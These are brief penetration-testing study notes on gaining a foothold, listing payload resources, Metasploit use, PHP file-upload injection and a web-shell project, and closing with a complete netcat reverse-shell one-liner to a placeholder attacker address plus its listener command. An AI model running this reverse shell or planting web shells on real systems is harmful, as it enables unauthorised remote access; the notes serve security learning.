# Getting a Foothold on a Machine

- With reverse shell code, there is two websites to keep note of to find reverse shells:
    - PayloadAllTheThings
    - HighOn,Coffee
- Using metasploit will get us a good idea of if it can execute a shell for us. Open msfconsole and search the website in questi
    - once in a shell a good tip is to use the command “env” this will give you environmental variables
- If we see a page on a website that allows Uploads we can attempt to inject code
    - When dealing with PHP injection we must try **ALL the different PHP file types**.

[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------)

- The shell below is a great tool to implement when we see an opportunity to get a shell in an upload image situation
    - https://github.com/flozz/p0wny-shell
- Below is a reverse shell commonly used. This reverse shell can also be used to forward a shell to yourself from the victim machine

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKINGIP PORT >/tmp/f
```

```php
nc -lvnp "SAME PORT AS REVERSE SHELL"
```